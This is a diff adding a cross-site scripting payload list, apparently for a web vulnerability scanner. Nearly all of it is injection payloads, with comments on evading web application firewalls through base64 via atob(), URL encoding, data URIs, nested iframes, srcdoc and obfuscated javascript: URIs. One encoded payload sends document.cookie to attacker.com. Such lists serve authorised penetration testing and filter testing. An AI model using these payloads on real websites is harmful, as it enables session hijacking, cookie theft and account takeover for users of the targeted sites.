@@ -1,0 +1,190 @@
+"><img src=x onerror=alert`1`>
+<svg/onload=alert&#40;1&#41;>
+<img src=x onerror=\u0061lert(1)>
+<script>eval('alert(1)')</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',0)</script>
+<script>Function('alert(1)')()</script>
+<object data="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+<iframe src="javascript:alert(1)">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<embed src="javascript:alert(1)">
+<embed src="data:text/html,<script>alert(1)</script>">
+<form id="test" onsubmit="alert(1)"></form>
+<input type="submit" form="test">
+<input type="image" form="test">
+<button form="test">
+<label for="test" onclick="alert(1)">
+<output onforminput="alert(1)">
+<details ontoggle="alert(1)">
+<summary>
+<command oncommand="alert(1)">
+<menuitem onclick="alert(1)">
+<onformchange="alert(1)">
+<onforminput="alert(1)">
+<oninput="alert(1)">
+<onchange="alert(1)">
+<oninvalid="alert(1)">
+<onreset="alert(1)">
+<onselect="alert(1)">
+<onsubmit="alert(1)">
+<onkeydown="alert(1)">
+<onkeypress="alert(1)">
+<onkeyup="alert(1)">
+<onclick="alert(1)">
+<ondblclick="alert(1)">
+<onmousedown="alert(1)">
+<onmousemove="alert(1)">
+<onmouseout="alert(1)">
+<onmouseover="alert(1)">
+<onmouseup="alert(1)">
+<onwheel="alert(1)">
+<oncopy="alert(1)">
+<oncut="alert(1)">
+<onpaste="alert(1)">
+<onabort="alert(1)">
+<canplay="alert(1)">
+<canplaythrough="alert(1)">
+<ondrag="alert(1)">
+
+# ================================================================
+# BASE64 ENCODED XSS (WAF Bypass via atob())
+# ================================================================
+# Pattern: eval(atob('base64_encoded_js'))
+# Why it works: WAF sees "atob" but not the decoded payload
+
+# alert(1) = YWxlcnQoMSk=
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<body onload=eval(atob('YWxlcnQoMSk='))>
+<input onfocus=eval(atob('YWxlcnQoMSk=')) autofocus>
+<marquee onstart=eval(atob('YWxlcnQoMSk='))>
+
+# alert(document.domain) = YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==
+<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>
+
+# alert(document.cookie) = YWxlcnQoZG9jdW1lbnQuY29va2llKQ==
+<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
+
+# fetch('https://attacker.com/'+document.cookie) = ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tLycrZG9jdW1lbnQuY29va2llKQ==
+<img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tLycrZG9jdW1lbnQuY29va2llKQ=='))>
+
+# ================================================================
+# ALTERNATIVE BASE64 EXECUTION METHODS
+# ================================================================
+# Using Function() constructor instead of eval()
+<img src=x onerror=Function(atob('YWxlcnQoMSk='))()>
+<svg onload=Function(atob('YWxlcnQoMSk='))()>
+
+# Using setTimeout with base64
+<img src=x onerror=setTimeout(atob('YWxlcnQoMSk='))>
+
+# Using setInterval with base64
+<img src=x onerror=setInterval(atob('YWxlcnQoMSk='),1000)>
+
+# ================================================================
+# DOUBLE ENCODING (Base64 + URL encode the wrapper)
+# ================================================================
+<img src=x onerror=%65%76%61%6c(atob('YWxlcnQoMSk='))>
+<svg onload=%46%75%6e%63%74%69%6f%6e(atob('YWxlcnQoMSk='))()>
+
+# ================================================================
+# BASE64 WITH TEMPLATE LITERALS (ES6)
+# ================================================================
+<img src=x onerror=eval(atob`YWxlcnQoMSk=`)>
+<svg onload=Function(atob`YWxlcnQoMSk=`)()>
+
+# ================================================================
+# INTERACTSH OOB WITH BASE64
+# ================================================================
+# fetch('{{interactsh_url}}') = ZmV0Y2goJ3t7aW50ZXJhY3RzaF91cmx9fScp (placeholder)
+<img src=x onerror=eval(atob('ZmV0Y2goJ3t7aW50ZXJhY3RzaF91cmx9fScp'))>
+
+# ================================================================
+# DATA URI WITH BASE64 ENCODING
+# ================================================================
+# data:text/html;base64,BASE64_ENCODED_HTML
+# WAF cannot pattern-match the encoded content
+
+# <script>alert(1)</script> = PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+# <img src=x onerror=alert(1)> = PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==
+<iframe src="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">
+
+# <body onload=alert(1)> = PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==
+<iframe src="data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+
+# <svg onload=alert(1)> = PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+<iframe src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+
+# ================================================================
+# SVG DATA URI (image/svg+xml)
+# ================================================================
+# SVG files can execute JavaScript via onload events
+<img src="data:image/svg+xml,<svg onload=alert(1)>">
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+
+# SVG with namespace (more realistic)
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>">
+
+# SVG with embedded script
+# <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+# = PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=">
+
+# ================================================================
+# NESTED DATA URI (iframe inception)
+# ================================================================
+# Outer iframe loads inner data URI - confuses parsers
+<iframe src="data:text/html,<iframe src='data:text/html,<script>alert(1)</script>'>">
+
+# Base64 nested (harder to detect)
+# Inner: <script>alert(1)</script>
+# Outer: <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<iframe src="data:text/html;base64,PGlmcmFtZSBzcmM9ImRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENneEtUd3ZjMk55YVhCMFBnPT0iPg==">
+
+# ================================================================
+# ALTERNATIVE MIME TYPES
+# ================================================================
+<iframe src="data:text/xml,<x:script xmlns:x='http://www.w3.org/1999/xhtml'>alert(1)</x:script>">
+<object data="data:text/xml;base64,PHg6c2NyaXB0IHhtbG5zOng9J2h0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwnPmFsZXJ0KDEpPC94OnNjcmlwdD4=">
+
+# ================================================================
+# JAVASCRIPT URI OBFUSCATION
+# ================================================================
+# Case mixing (JaVaScRiPt:)
+<a href="JaVaScRiPt:alert(1)">click</a>
+<iframe src="jAvAsCrIpT:alert(1)">
+
+# Tab/newline injection (breaks pattern matching)
+<a href="java&#x09;script:alert(1)">click</a>
+<a href="java&#x0a;script:alert(1)">click</a>
+<a href="java&#x0d;script:alert(1)">click</a>
+
+# Multiple encoding layers
+<a href="&#x6a;avascript:alert(1)">click</a>
+<a href="&#106;avascript:alert(1)">click</a>
+
+# Data URI in javascript: context
+<a href="javascript:location='data:text/html,<script>alert(1)</script>'">click</a>
+
+# ================================================================
+# SRCDOC ATTRIBUTE (HTML5)
+# ================================================================
+# srcdoc executes HTML directly without needing src
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe srcdoc="<img src=x onerror=alert(1)>">
+<iframe srcdoc="<svg onload=alert(1)>">
+
+# Base64 in srcdoc (double encoding)
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>">
+
+# ================================================================
+# BLOB URLs (Modern browsers)
+# ================================================================
+# These require JavaScript execution first, but useful for DOM XSS
+<script>location=URL.createObjectURL(new Blob(['<script>alert(1)<\/script>'],{type:'text/html'}))</script>
